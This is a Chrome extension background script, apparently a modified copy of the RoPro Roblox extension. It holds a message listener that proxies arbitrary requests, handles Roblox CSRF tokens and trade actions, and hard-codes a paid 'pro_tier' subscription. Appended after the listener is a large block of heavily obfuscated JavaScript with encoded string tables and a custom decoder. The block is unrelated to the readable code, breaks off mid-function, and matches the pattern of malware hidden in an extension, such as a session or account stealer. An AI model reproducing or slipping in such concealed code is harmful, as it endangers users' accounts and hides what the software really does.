chrome.runtime.onMessage.addListener(function(request,sender,sendResponse)
{
	switch(request.greeting) {
		case "GetURL":
			if (request.url.startsWith('https://ropro.io') || request.url.startsWith('https://api.ropro.io')) {
				async function doPost() {
					verificationDict = await getStorage('userVerification')
					userID = await getStorage('rpUserID')
					roproVerificationToken = "none"
					if (typeof verificationDict != 'undefined') {
						if (verificationDict.hasOwnProperty(userID)) {
							roproVerificationToken = verificationDict[userID]
						}
					}
					$.post({'url':request.url, 'headers': {'ropro-verification': roproVerificationToken, 'ropro-id': userID}}, function(data) {
						sendResponse(data);
					}).fail(function() {
						sendResponse("ERROR")
					})
				}
				doPost()
			} else {
				$.get(request.url, function(data) {
					sendResponse(data);
				}).fail(function() {
					sendResponse("ERROR")
				})
			}
			break;
		case "GetURLCached":
			$.get({url: request.url, headers: {'Cache-Control': 'public, max-age=604800', 'Pragma': 'public, max-age=604800'}}, function(data) {
				sendResponse(data);
			}).fail(function() {
				sendResponse("ERROR")
			})
			break;
		case "PostURL":
			if (request.url.startsWith('https://ropro.io') || request.url.startsWith('https://api.ropro.io')) {
				async function doPostURL() {
					verificationDict = await getStorage('userVerification')
					userID = await getStorage('rpUserID')
					roproVerificationToken = "none"
					if (typeof verificationDict != 'undefined') {
						if (verificationDict.hasOwnProperty(userID)) {
							roproVerificationToken = verificationDict[userID]
						}
					}
					$.ajax({
						url: request.url,
						type: "POST",
						headers: {'ropro-verification': roproVerificationToken, 'ropro-id': userID},
						data: request.jsonData,
						success: function(data) {
							sendResponse(data);
						}
					})
				}
				doPostURL()
			} else {
				$.ajax({
					url: request.url,
					type: "POST",
					data: request.jsonData,
					success: function(data) {
						sendResponse(data);
					}
				})
			}
			break;
		case "PostValidatedURL":
			$.ajax({
				url: request.url,
				type: "POST",
				headers: {"X-CSRF-TOKEN": myToken},
				contentType: 'application/json',
				data: request.jsonData,
				success: function(data) {
					if (!("errors" in data)) {
						sendResponse(data);
					} else {
						sendResponse(null)
					}
				},
				error: function(response) {
					if (response.status != 403) {
						sendResponse(null)
					}
					token = response.getResponseHeader('x-csrf-token')
					myToken = token
					$.ajax({
						url: request.url,
						type: "POST",
						headers: {"X-CSRF-TOKEN": myToken},
						contentType: 'application/json',
						data: request.jsonData,
						success: function(data) {
							if (!("errors" in data)) {
								sendResponse(data);
							} else {
								sendResponse(null)
							}
						},
						error: function(response) {
							sendResponse(null)
						}
					})
				}
			})
			break;
		case "GetStatusCode": 
			$.get({url: request.url}).always(function(r, e, s){
				sendResponse(r.status)
			})
			break;
		case "ValidateLicense":
			subscriptionManager.validateLicense()
			tradeNotifierInitialized = false
			break;
		case "DeclineTrade": 
			$.post({url: 'https://trades.roblox.com/v1/trades/' + parseInt(request.tradeId) + '/decline', headers: {'X-CSRF-TOKEN': myToken}}, function(data,error,res) {
				sendResponse(res.status)
			}).fail(function(r, e, s){
				if (r.status == 403) {
					$.post({url: 'https://trades.roblox.com/v1/trades/' + parseInt(request.tradeId) + '/decline', headers: {'X-CSRF-TOKEN' : r.getResponseHeader('x-csrf-token')}}, function(data,error,res) {
						sendResponse(r.status)
					})
				} else {
					sendResponse(r.status)
				}
			})
			break;
		case "GetUserID":
			$.get('https://users.roblox.com/v1/users/authenticated', function(data,error,res) {
				sendResponse(data['id'])
			})
			break;
		case "GetCachedTrades":
			sendResponse(inboundsCache)
			break;
		case "DoCacheTrade":
			function loadInbound(id) {
				if (id in inboundsCache && inboundsCache[id] != null) {
					sendResponse([inboundsCache[id], 1])
				} else {
					$.get('https://trades.roblox.com/v1/trades/' + id, function(data) {
						console.log(data)
						inboundsCache[data.id] = data
						sendResponse([data, 0])
					}).fail(function(r, e, s) {
						sendResponse(r.status)
					})
				}
            }
            loadInbound(request.tradeId)
			break;
		case "GetUsername":
			async function getUsername(){
				username = await getStorage("rpUsername")
				sendResponse(username)
			}
			getUsername()
			break;
		case "GetUserInventory":
				async function getInventory(){
					inventory = await loadInventory(request.userID)
					sendResponse(inventory)
				}
				getInventory()
				break;
		case "GetUserLimitedInventory":
			async function getLimitedInventory(){
				inventory = await loadLimitedInventory(request.userID)
				sendResponse(inventory)
			}
			getLimitedInventory()
			break;
		case "ServerFilterReverseOrder":
				async function getServerFilterReverseOrder(){
					var serverList = await serverFilterReverseOrder(request.gameID)
					sendResponse(serverList)
				}
				getServerFilterReverseOrder()
				break;
		case "ServerFilterNotFull":
				async function getServerFilterNotFull(){
					var serverList = await serverFilterNotFull(request.gameID)
					sendResponse(serverList)
				}
				getServerFilterNotFull()
				break;
		case "ServerFilterRandomShuffle":
				async function getServerFilterRandomShuffle(){
					var serverList = await serverFilterRandomShuffle(request.gameID)
					sendResponse(serverList)
				}
				getServerFilterRandomShuffle()
				break;
		case "ServerFilterRegion":
				async function getServerFilterRegion(){
					var serverList = await serverFilterRegion(request.gameID, request.serverLocation)
					sendResponse(serverList)
				}
				getServerFilterRegion()
				break;
		case "ServerFilterBestConnection":
				async function getServerFilterBestConnection(){
					var serverList = await serverFilterBestConnection(request.gameID)
					sendResponse(serverList)
				}
				getServerFilterBestConnection()
				break;
		case "ServerFilterNewestServers":
			async function getServerFilterNewestServers(){
				var serverList = await serverFilterNewestServers(request.gameID)
				sendResponse(serverList)
			}
			getServerFilterNewestServers()
			break;
		case "ServerFilterOldestServers":
			async function getServerFilterOldestServers(){
				var serverList = await serverFilterOldestServers(request.gameID)
				sendResponse(serverList)
			}
			getServerFilterOldestServers()
			break;
		case "ServerFilterMaxPlayers":
			async function getServerFilterMaxPlayers(){
				servers = await maxPlayerCount(request.gameID, request.count)
				sendResponse(servers)
			}
			getServerFilterMaxPlayers()
			break;
		case "GetRandomServer":
			async function getRandomServer(){
				randomServerElement = await randomServer(request.gameID)
				sendResponse(randomServerElement)
			}
			getRandomServer()
			break;
		case "GetProfileValue":
			getProfileValue(request.userID).then(sendResponse)
			break;
		case "GetSetting":
			async function getSettings(){
				setting = await loadSettings(request.setting)
				sendResponse(setting)
			}
			getSettings()
			break;
		case "GetTrades":
			async function getTradesType(type){
				tradesType = await loadTradesType(type)
				sendResponse(tradesType)
			}
			getTradesType(request.type)
			break;
		case "GetTradesData":
			async function getTradesData(type){
				tradesData = await loadTradesData(type)
				sendResponse(tradesData)
			}
			getTradesData(request.type)
			break;
		case "GetSettingValidity":
			async function getSettingValidity(){
				valid = await loadSettingValidity(request.setting)
				sendResponse(valid)
			}
			getSettingValidity()
			break;
		case "GetSettingValidityInfo":
			async function getSettingValidityInfo(){
				valid = await loadSettingValidityInfo(request.setting)
				sendResponse(valid)
			}
			getSettingValidityInfo()
			break;
		case "CheckVerification":
			async function getUserVerification(){
				verificationDict = await getStorage('userVerification')
				if (typeof verificationDict == 'undefined') {
					sendResponse(false)
				} else {
					if (verificationDict.hasOwnProperty(await getStorage('rpUserID'))) {
						sendResponse(true)
					} else {
						sendResponse(false)
					}
				}
			}
			getUserVerification()
			break;
		case "HandleUserVerification":
			async function doUserVerification(){
				verification = await verifyUser(request.verification_code)
				verificationDict = await getStorage('userVerification')
				if (typeof verificationDict == 'undefined') {
					sendResponse(false)
				} else {
					if (verificationDict.hasOwnProperty(await getStorage('rpUserID'))) {
						sendResponse(true)
					} else {
						sendResponse(false)
					}
				}
			}
			doUserVerification()
			break;
		case "SyncSettings":
			syncSettings()
			setTimeout(function(){
				sendResponse("sync")
			}, 500)
			break;
		case "OpenOptions":
			chrome.tabs.create({url: chrome.extension.getURL('/options.html')})
			break;
		case "GetSubscription":
			async function doGetSubscription() {
				subscription = "pro_tier"
				sendResponse(subscription)
			}
			doGetSubscription()
			break;
		case "DeclineBots":
			async function doDeclineBots() {
				tradesDeclined = await declineBots()
				sendResponse(tradesDeclined)
			}
			doDeclineBots()
			break;
		case "GetMutualFriends":
			async function doGetMutualFriends(){
				mutuals = await mutualFriends(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualFriends()
			break;
		case "GetMutualFollowers":
			async function doGetMutualFollowers(){
				mutuals = await mutualFollowers(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualFollowers()
			break;
		case "GetMutualFollowing":
			async function doGetMutualFollowing(){
				mutuals = await mutualFollowing(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualFollowing()
			break;
		case "GetMutualFavorites":
			async function doGetMutualFavorites(){
				mutuals = await mutualFavorites(request.userID, request.assetType)
				sendResponse(mutuals)
			}
			doGetMutualFavorites()
			break;
		case "GetMutualBadges":
			async function doGetMutualBadges(){
				mutuals = await mutualFavorites(request.userID, request.assetType)
				sendResponse(mutuals)
			}
			doGetMutualBadges()
			break;
		case "GetMutualGroups":
			async function doGetMutualGroups(){
				mutuals = await mutualGroups(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualGroups()
			break;
		case "GetMutualLimiteds":
			async function doGetMutualLimiteds(){
				mutuals = await mutualLimiteds(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualLimiteds()
			break;
		case "GetMutualItems":
			async function doGetMutualItems(){
				mutuals = await mutualItems(request.userID)
				sendResponse(mutuals)
			}
			doGetMutualItems()
			break;
		case "GetItemValues":
			fetchItemValues(request.assetIds).then(sendResponse)
			break;
		case "CreateInviteTab":
			chrome.tabs.create({url: 'https://roblox.com/games/' + parseInt(request.placeid), active: false}, function(tab) {
				chrome.tabs.onUpdated.addListener(function tempListener (tabId , info) {
					if (tabId == tab.id && info.status === 'complete') {
						chrome.tabs.sendMessage(
							tabId,
							{type: "invite", key: request.key}
						  )
						chrome.tabs.onUpdated.removeListener(tempListener);
						setTimeout(function() {
							sendResponse(tab)
						}, 2000)
					}
				});
			})
			break;
		case "UpdateGlobalTheme":
			async function doLoadGlobalTheme(){
				await loadGlobalTheme()
				sendResponse()
			}
			doLoadGlobalTheme()
			break;
		case "LaunchCloudPlay":
			launchCloudPlayTab(request.placeID, request.serverID, request.accessCode)
			break;
	}

	return true;
});
var aX,aY,aZ,ba,bb,bc,bd,be,bf;const bg=[0x0,0x1,0x8,0xff,"length","undefined",0x3f,0x6,"fromCodePoint",0x7,0xc,"push",0x5b,0x1fff,0x58,0xd,0xe,0x7f,0x80,0x86,0xc1,0xc2,0xb6,0xd6,0xdf,0xda,0xdc,0xe0,!0x0,0x9e,0xbc,0xef,0x7e,0xcd,0xce,0xcf,0xd0,0xd1,0xd2,0xd3,0xd4,0xd8,0xb31856,0xd9,0xdb,0xdd,0xde,0xe1,0xe2," (",")",0xe3,0xe4,0xe5,0xe6,0xe7,0xe8,0xe9,0xea,0xeb,0xec,0xed,0xee,0xf0,0xf1,0xf3,0xf8,0xfa,0xfb,0xfc];function bh(aX){var aY="[uOA^vGj}F;`ReU]0I2$c{(My=<67s>#ag&4198%HfDBCoL@txw!N3d_PqlTpYXJ|b,r)+V\"zE5?~hn*kQZ:.m/WiKS",aZ,ba,bb,bc,bd,be,bf;aZ=""+(aX||"");ba=aZ.length;bb=[];bc=bg[0x0];bd=bg[0x0];be=-bg[0x1];for(bf=bg[0x0];bf<ba;bf++){var bh=aY.indexOf(aZ[bf]);if(bh===-bg[0x1])continue;if(be<bg[0x0]){be=bh}else{be+=bh*bg[0xc];bc|=be<<bd;bd+=(be&bg[0xd])>bg[0xe]?bg[0xf]:bg[0x10];do{bb.push(bc&bg[0x3]);bc>>=bg[0x2];bd-=bg[0x2]}while(bd>bg[0x9]);be=-bg[0x1]}}if(be>-bg[0x1]){bb.push((bc|be<<bd)&bg[0x3])}return bk(bb)}function bi(aZ){if(typeof aX[aZ]===bg[0x5]){return aX[aZ]=bh(aY[aZ])}return aX[aZ]}aX={};aY=["G4|E?t01{lzV;wF#y)O","IGn~wVJu","5tQ}n_G>KX{&76>>p)e#KqG>FI=;L=s43qm7Zw^/G","?I&zlLEerd9+&9/Hgs)<[&JssUYu&9%8h!Fa{qdO","OdS!@ZayqIwPg^v$MppsLJo@tR,PGv7D$]g!HE6sJpz4d=C$VoT}","D!VNl!$j2$","/THdu..&TP&t{zu9","bA/79YYMOq6&c\"f=h98NOpzG}e@X&xIH6)T}F1d2v;Kh{vXM","&Av5HJju],Fzle}","5`yg2~Isyl+3{0[2<)@N.X@e,Rz(b^]<ddHGVp2/DUJ`BO,97u","F)Zsh+/NxFVkYxS14RDa[zI+@JZv{0^={)njuQ<k9eF)/UXsoRO","Pd:a6m0O","5PPED9nL\"lzhqY>>MqO","~)phRwwL@pB#X+276Mv5PV3@v",":G.5moKmoTv9hp!f_XOvQNdO*pXUg^h%[^mwN%/HOJm(89}2UR%xdh*u","Dqla;w?!5`;e7TG","bM9;,.[","jq!;2+(}b]/2F.u15TU~i@ef4|r3st!&KT37k~h*il&","STC#n5rqU{8~cAh8@b2z=HB@F;msz]N7qFdN94*u","cd_Gq*Ie>T_k+=z2+cm#mT%@cq|NWVTf`<QGWnM41eNjEtJ>1q?3>@Qe^","xoWxsE:4PcFY=^lf;)45|.W+v$bT>v","tA95!LI3$|X2_UNfB!}d!lp2QR","YT[GY*E+gJ/2U974<pj>^_01Ipd,3^ls[2HG)t?mV|&{Uv","Mp87J5hm.|I+4@pMZ#O?.\"7}^F;tlYE#?GJ7{m\"s.|mqD=O9;u","5Md7Jl5LJRa67AKM`R0gb_R11e+^z]41g9wa_Zx4Q2B+h=G","p<zx$\"$u","~Mrhj5pk1dhP{18yzDl}TLTmTTO9W8498tv5y8N|n}r{u","/Es5hQZH[qM6_VOyMbjF2Q[D)q7Ideh<Z!V7Dd)GkRFe6UK4r[","sL?5QX|LMc&,P:N7:bv#K:Rl0RRljwwH]paxZqlHv","QbLjfPKfeXgXi]b222`h^*K*X2C,>vm&U\"cj","EXm5NPC|}l#A90s1Z#ch++4emdb`up?%yLDa>d[","{Mixy@KjsU3j?8r=FJv_VXyN9ejb\"8a2~!~#FpNO4d.3pA","VM(^8HWq&Fr3wxpMu5PF","F9|GU+{4<U<e?8}","]a[>!?iLKUf_k\"4>hI$sV+(NuRl","lcC57\"o$9|4jUYe","BsPd.+G/yc+VI0xH:cF>%JA+G","U9o;(+s$nTt^NAg1aBL_;XIfmd}F3^","%to^`+muNeK5YxKfh=n#1P%uze","kU(7?w@J}l[z[0,96po7Plj3KU7y4wTDfqYjV_8>7b1","+GjN[*Gl@]9","@cojMmzyL,!J}]`c?cJ7sm/RFUS<|:9$tA8jB9=4j","C5VNJ.:4hXH76Z9#)[","690G]\"LH@3Z}&e&9h)EdHd(/Y3tE*4b1fIEdcNsf=Xt~[","0\"U~/gu$Hcsb!VdHX#8^z~+ssUI?=zby{d~j+*<yvel","b)a!{NJuTP`l>vz2YM@N)zo4=crJ}%M4}B]FfPdLb2YP.A5=Tb^v{","P)$;nQ5Nt2s+f^","EA5a`w%@Ndms4Z%=,):h#\"^}flCk89g90LGNOL@4]JHI@Oc6Sc.v","9\"<s}p<1j|5atAj9kG7szt4sQFIZr8#Ii7raR+%u]ROF?VC$r[",";s%~6n]@1|)=i]W0OJ~<05!e4$_UOQW4&FF6BdYMF_Zs!ZSDK[","}4dN(n)LYP3EW\"sIxH%7/\"re#]G9Yyk&","@XY#q*[}ud})MOMH[x#G6HrMZRcy+yC%EX=>iN6?:qr=Y^j=aFf6EtC>G","=<.54nZ&tF~1,9M&EU<z{HNHC397y6#IMcOz!!rf)F!{0A","SX(^I~E?5U!748W4~Mud~+_4Kc`?up&1$FIG>kGyWe:r*O","\"Xgzwlm4zb)=Qk#>]LKG:n3@1qBXvz)8","o<_~T*?s5Iu0&eAI65wzp&G2OR#&#O","t!LFGtkypUsNp]e","jLr5)pH2nJaX]<c7XI\"7U5Ms*R","FM_E%J[};cQ]\"lU<NGaEin{@fI<z#AZ%cd|dZ~WMfXM~$8+$EP=69k(1YXPEu","Ht4hRtSNT`Gc<9^8lUo5p.>/s{0).47M.#bdkN[","?!|EEpJu?UJTG9wHZ=]gI:&>qcr],QR<y!);c","h=v5b3{@#J.30]<ft#hjc","q!kdMnq4Fc#X4wR<;qA","sF*Nj3$@hU>II0*Hep?5P.445T8*<O9y`59jh5759e","sM_^::5/lc","!9|d?XeeG","%q]g<8aRG_O@?V_s+G?vu.Eja,j)YpJI(bz!FQ?J~}_7u.I6","Vou>55j+3eFzQtj$.!;he_&2Hl!yPA7I","?GDz8d`QPcG*|p|DNF(Nz*/)EbyIf^","dRFnM8e=U,Hyj<TDQ[","*U+#\"3O}8lis8xi0!Rr}}~5NC}",":T$zB?9e}_T4R]:6HX!h_Z|2CT;tw=2c$!+~{~4+s{X=htj#r)#G","b9kGb*>23dEr_VG=$<u>v1_j)q}l/=E2LG.sw.P):$S}FzA>NFV7(\"3fA","D<I?<n.R|2DA>vKDsHnj2qQs5X=+:O)I_Gnj","j\"+wx9]$r$2XrU+20Jc5c~>NEIzrDOif~#_~q.$jScP","\"c3;%m[","(R+#&TU/9$&y_UyDC5>7,.~Hd$n3zA","LRTsG5y/_ee?kpp4xH@FT3I$uJmvEpj=l)Z}p*jQ~PkxE1e6}L#djw[l7TCju","0dl}!Z(|KI1~i]!HTHT}m~lOxdoT4wecd!I>89Qf+$S<^A","SA5!J_`eXP{+C@_&/b#x{","@R<z_!!u","eaAzT!=3>,s~vYOy%RL~KnK4.|(*.A","IBPE=q}/&RZV~1)29)o7#mLR|p{!u","Wb,haNpL.F","~T(E#ToJ0,gz#A","[2%7gd;/L,HN/QdfmtUgTzM$BcRe~A>yVF0G*o,ln3Izvp18","HX=?wl11~}wyN6a>Dbm5Ww;L@36zPyR$5!\"FS~[","M)p5aHy1j_=yvz1>d!rw;5y1TPOe4OF%iteN>","F4:3?tmma,V4H61IUqla;X2yIJD4R])y","N&0g@l`+o3V]D988r78N%@F+_e","8!=nTlsf[{P","D)]d.woj%lt","1do~btHk=bd7/x>y`<J7$T&yr|O9tA<7rG[Glh%jY`)k$AW7/7g>AQ^D@,7","Db=G:g$3>,yA{0?=_Xhw{","LBRs4Yy}KcA>C\"}$FsM~p.^2aq345+Rc|A>~b3fu","9qu6Q\"+J0p/hmx[D_HH>1)>2#RyGBZ1#M5ChI","^)SaKm]e2RP7*8y&kVkEgEBu","qbu?IN(k0p)]a:34?IA","1R+\":w%jyc,`%O)21<I!f4oj<c:h1zv9eJWN|py19l:VT6K7%t@xSnfuCT=","bd?a=nf$~}*p1AaMG2ej8@}1)eGG^6%28!Bs{NRO","4<n\"5X5>JJ])v90&+7/N3?Uyzc","HGm5bQPH6c}0Gvgy_IM7LV|LaJt`u","(sJFz5Ul&qtkYtWf^F6az5LNwJ[?BV:fWt,3+_ULPe2Gl+vB=u","\")vN>YUVuJ`A&vyDU\"JF@){@^emaP61IY9InB!HO\"l*u5+?<","cLIGG+:jgJ3+f=_f<u","]q]G4H82L`Az}\"F%jx|!=","u{N5hq[","~&[n/\"y>oUc9/+*%pb+;*_f?JJoyvpi0o9.vF~CR;bJxg0J>fBTawlHNQ2\"V[","v)i!hq.&+l*`AVf%LXKaS:H|`b4*mpIcqX4alLHRHIE^kA","P&dN.\"~N4qB{n=0c{H*7q%?fL}:LTUIH","l9#7^t\"j($Zh6w]6]HI?KE~yJ3#*x0H9eBf!#Tl5TbwP8e89`a]ggHWu","9Al}xPx?xF","r#J7IqCyYTv&1\"5=^pm^kw1|qbw~%<m7g)+N[z[D:Rl","Odh#WoU1.|zLhznH[RA","gHd~LZ`e/eY`Kp/f]dR;`/EJ|pc~Q+A9%B2zn~lH@,p2\"VG","j\"\"7;8s@0{4*w9p1uH4h::~RTbiq+^5$Iqm7`8UL1ds*u","obXxoPqmo{D","V!+j%d_u","=F8#wZ5&2$7z/U71Ndv;","II)2,br/|~#{?Vlyt:","4IrbeCV/","|[1hhR@","Vd~=#k6t<~hP/W<","9q{;IQYm<}cl?8]%LRd\">nz/jI<lhkY43M7hw?./T3_VM@v$CXa6@%1R|FYhxe/0i3a!_*I4Wl{!de344B2!|*;25U1+Qz}2[Fgd:\"6$^qyy,eiD%5/^dzj=/jkrS81>1]Hxpl(Lrpw+Nz37=BiFc","9q{;IQYm<}(ZBlC$|Dbd#\".y?I>b`:B8OM{;}*zl73%kz:^B|Dbd#\".y?I>b`:B8eGyFM~jQ02","F6&mEIfJsYPT8Vz?%bc4~A\"8En","47Ym;","oS7KHugOExs:IC#d&t!#Drn\"VxAYX]Qn+|{},[e(wxbvKWce%S[r5@R>AH","(8tq?[e(b","O|?}^{Df","&tZtSxyaaSj;_4$;tj6",";8>,|lz(|D","6T(wN@sf","y#!#E","H<DH","`lhR;MH0Zx9nTB:Ds|vsrtM;&}}VvprpSohRoK)eZ@S8]FOL","coQ#>P~c5","0N>sGKU_",":QXQlx3{{l+I,WkIQ+9","IoSuNaYcNU","9vc(?Am_","3&)&Z","F6&mEIfJsY(gFVk+=(Lg5)f}Y#/`@x<rF~)(F_vQ@`[D,","Oea;3&,&3sf","@qReWut@5","|*W=I/B9","jR}RpUK~~pL<62G<RL_","<qam*&H@*B","_#@w>Ex9","KyZyT","F6&mEIfJbL*R`vXF)Fc4UT~QW`bVg]E+{5VS~AZ*qe#{JCn$Q7Z://,","F~2L8dyi<`:\"Hfjr87Z:$M>Oi","lFERV}el^","ngVi#s?0","[EXE>r(qq>N9tJm9ENL","9F!Ygh+lg?","Lyl&oHQ0","(cDcf","$<^4`t,","*o0\"HR_YtwPDq(%}&8U;dm./1J38OCCQT}nFM5>%90E12__C&1qtx<CwlB_pKy","#9Nws<6#)","YIsF7+Mz","$NbNo[XiioLGu2rGNL=","G9xAIm{#IM","=y#;1|!z","XTpTe","8[I+3RK(cm=x8Z^0S=>x}CK;m|tB:%oJ8@)=8rbF:Bw`l","=TEf[H?>o3pk8Z]\"oowf2#.)nBWj]=^nk8J,;@H5+2fvV^_J5$w>\"_|RHU^PBbdnC8:fnXb!","|\"E>p=e|5","(zpH{_2!","4EDE[mT99[r1W?k1Er~","1\"F,zX&|z2","~$|fxP}!","T/v/c","$/t]+F?|[SUK>Yr$XASY0m?OyUD.j!8d$om&*OK4%o.vI","UTES6&kUc","|@6uq#Ax","pEhE/yRBB/XVf,KVEXI","VT4{@};U@A","IJU_Y*0x","R2v2P","F6&mEIfJsYiymH;k$<GL/)FIw~_\".}0EQp|{Q)4I<`R[8V8","#72L>(0#i",".9@R[6lx","E;~;{P8DD{f,AnK,;f2",",`?(9%1w9l","2_waYerx","8UTUG","s7eS@dM$UG+=^He;o62Ls","R^xA$CHure2Ur^/?8K%;B:{Zre2","p<UmAN3CGE","ti6,eBZ]5[fVNZS{ooyvIv|O5e_09d;gdt&R<gKkHVbJx3G","?nw%E<z(v[#0JRwjvifaAx}(K>W0nQ]5rD\"[(oHU+e}IBw!t.|k^D",">a9a5","3nWvu","koyvtPep!","_uR@XrK*V>fWkpi`w7/U;/.","ti6,eBZ]5[BJhZRz#2Q%AXJOK6+RhZZ&=R#YUBo1HV:","(A*%[|E(E)W0lZ*2","2Y8}v<rl","vMI;+","Bz\"`9",":KA%.BYl","pDhHc|P45d~#]sz+iB6EjfV,1c?6IQ]8LKhHdO.sr((NSF~2a2fE]}<}T=}N.v%k[]tj~>_(8iA","4]?m>\"YD8AcE6[3i($jkw:OM}>rjf;6IXz?mACF[Kv9.7Tc%J%:k60s0<R09F)+bG6xwc#dvI(o","]7&mA)nO","i<;i&","JjeSA(t]3iBCnfW","DUCS8dMi<`~DNxQFj<eS","h<Q4Q","=62AG:_ZK\"v","b<eSA(t]i","~F^49R=O","77v:wC>Oo`~D:P","HK<L","Jjodg2lKTB2>JT1s;w,X","b<P:<C,","wbxL6R=O","OP@Ah","KcXGqmHOL^fZHkb$nK>igT~Qs!","mPpAA(,","x2yAh","^S[Ahx!O","Ewi{:IX?{E","gwpAG:!O","KcZIFWzPC]6wRtO`^x4hmI<8i","KcXGfFHO$G+=^Hr@$UxY6R_,","KcZIIqHOcW[D^HF@Z`#A9R,","KcXGPnHO$G)qK","KcXG]?HOBNr~V(u5mK","IppA6:>QX","KcH^v@HOyY.M$P^","z`>:MI!O#vCR8VHF_p[AA)%Q?eA=Ofs0","KcZI&;HO76KlBg?@/72AOVwQGE","|.9>lTy}nvCR8VHF/Wp","KcZI{LHO16W|8V8","9.m2lTf}yE%","8v&mA)cO","]b[L7d?O46^y)g=!A,",".SM.m[y8X#","F6&mEIfJsYk2mfz?b<!:u4&IkneYKktw.SM.GAZ*qeMdv].kr=ks#/dX/.PV^O|kNwLS",";<VSA(cO","^bxA(qJ;ReJRmHRbx!p","F6&mEIfJsY^T=x|5owzAgy$yyE!BV(L+*!~(7d3ZReE2C7vkb<@A/)s#4L_Nrf95:RGbN5+J$E>BWxyr{FSAwCUy8\"`M:vN5uYt:Q/QW<L([%f{sA6({Q)s#,YKl(ra7$b&mZ_tCq!c9pO{rWK","(|yA!}PL=n.","t2=S","+|yA!}PL=nWQp%8","F6&mEIfJsY^T=x|5owzAgy$yyE!BV(L+*!~(7d3ZReE2C7vkb<@A/)s#4L_Nrf95?Ekg8?M1oNTghP2/.SM.GAb?n\"k}nO*kTT,gtUan@E!o0r7+.wW9}VKK+e2","[.tYf:hyyE","i!7/4)h#_\"fU3R?@@<CS","u~2LgT_*6!l~K","F6&mEIfJsYq`/fdr)2.(Q)V*k.pTY8Q;k(eX|)HioN3%Llf0F<X92VX?X","Q6[AI}+yyETMXH","k62L9_=O!mk","VL}>/(Yys`}C0RB;T4V.._4#gn",".b&mQ(,","t^Um}6!O.#RMk060<6whL","^bxA(qJ;ReJRmHRbx!/RbJN*qemfQH","i!7/4)h#_\"A!Gr@+I2;mII,","<B7hR5F$j","2]{;",".!tF","9q{;IQYm63un+zeHhG^hJ.QId||,#:B8;u","O^`a=","e!K!q3P22qZs*UlsK[",";^Aaa\"["];function bj(){var aX=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],aY,aZ,ba;aY=void 0x0;aZ=[];try{aY=Object;aZ[bg[0xb]]("".__proto__.constructor.name)}catch(bb){}a:for(ba=bg[0x0];ba<aX[bg[0x4]];ba++)try{var bc;aY=aX[ba]();for(bc=bg[0x0];bc<aZ[bg[0x4]];bc++)if(typeof aY[aZ[bc]]===bg[0x5])continue a;return aY}catch(bb){}return aY||this}aZ=bj()||{};ba=aZ.TextDecoder;bb=aZ.Uint8Array;bc=aZ.Buffer;bd=aZ.String||String;be=aZ.Array||Array;bf=function(){var aX=new be(bg[0x12]),aY,aZ;aY=bd[bg[0x8]]||bd.fromCharCode;aZ=[];return function(ba){var bb,bc,be,bf;bc=void 0x0;be=ba[bg[0x4]];aZ[bg[0x4]]=bg[0x0];for(bf=bg[0x0];bf<be;){bc=ba[bf++];bc<=bg[0x11]?bb=bc:bc<=bg[0x18]?bb=(bc&0x1f)<<bg[0x7]|ba[bf++]&bg[0x6]:bc<=bg[0x1f]?bb=(bc&0xf)<<bg[0xa]|(ba[bf++]&bg[0x6])<<bg[0x7]|ba[bf++]&bg[0x6]:bd[bg[0x8]]?bb=(bc&bg[0x9])<<0x12|(ba[bf++]&bg[0x6])<<bg[0xa]|(ba[bf++]&bg[0x6])<<bg[0x7]|ba[bf++]&bg[0x6]:(bb=bg[0x6],bf+=0x3);aZ[bg[0xb]](aX[bb]||(aX[bb]=aY(bb)))}return aZ.join("")}}();function bk(aX){return typeof ba!==bg[0x5]&&ba?new ba().decode(new bb(aX)):typeof bc!==bg[0x5]&&bc?bc.from(aX).toString("utf-8"):bf(aX)}function bl(aZ,ba=bg[0x1]){function bb(aZ){var ba,bb;function*bc(bb,bc,aX,aY={i:{}}){while(bb+bc+aX!==0xb3)with(aY.h||aY)switch(bb+bc+aX){case aY.i.w+0x93:aY.h=aY.u,bb+=-0x12,bc+=0xe2,aX+=0x2;break;case bc- -0x1f:case 0x7e:aY.i.n=[];aY.i.o=bg[0x0];aY.h=aY.i,bc+=0x14e,aX+=-0x16a;break;case 0x67:n.push((o|q<<p)&bg[0x3]);aY.h=aY.i,bc+=0x31,aX+=0x4b;break;case bc- -0x144:return ba=!0x0,bk(n);case bb- -0xcf:case 0xb8:aY.i.w=-0xcd;i.k="@:/1[wKg*o|#<F$I3vfZrAx4c+VSNGt2hT%n6O^9y8EdMH)mPpD}]z=U7\"B,_WaQs~`Y{J>RLuk.ibe(;C&X!0l?jq5";i.l=""+(aZ||"");i.m=i.l.length;aY.h=aY.i,bb+=-0x9d,bc+=-0x17d,aX+=0xb5;break;case 0xe3:return ba=!0x0,bk(n);case 0x51:case 0x5c:case 0xd5:aY.h=aY.i,bb+=-0x15d,bc+=-0x31,aX+=0x199;break;case-0xe9:aY.i.p=bg[0x0];aY.i.q=-bg[bc+-0x61];for(aY.i.r=bg[0x0];r<m;r++){aY.i.s=k.indexOf(l[r]);if(s===-bg[bc+-0x61])continue;if(q<bg[0x0]){q=s}else{q+=s*bg[bc+-0x56];o|=q<<p;p+=(q&bg[0xd])>bg[bc+-0x54]?bg[bc+-0x53]:bg[bc+-0x52];do{n.push(o&bg[bc+-0x5f]);o>>=bg[bb+0xd6];p-=bg[0x2]}while(p>bg[0x9]);q=-bg[bb+0xd5]}}if(q>-bg[0x1]){aY.h=aY.i,bc+=-0xfc,aX+=0x24c;break}else{aY.h=aY.i,bc+=-0xcb,aX+=0x297;break}case 0xeb:case bb!=-0x25&&bb!=-0xd4&&bb-0x15:default:aY.i.w=0x33;aY.h=aY.i,bb+=-0x31,bc+=-0x49,aX+=0x199;break}}ba=void 0x0;bb=bc(-0x37,0x91,0x3e).next().value;if(ba){return bb}}function bc(aZ){if(typeof aX[aZ]===bg[0x5]){return aX[aZ]=bb(aY[aZ])}return aX[aZ]}Object[bc(0x77)](aZ,bc(0x78),{[bc(0x79)]:ba,[bc(0x7a)]:!0x1});return aZ}bi(0x7b);const bm=bi(0x7c);async function bn(aZ,ba,bb,bc,bd,be,bf,bh,bi,bj,bl,bn,bo){if(!bb){bb=function(aZ){if(typeof aX[aZ]===bg[0x5]){return 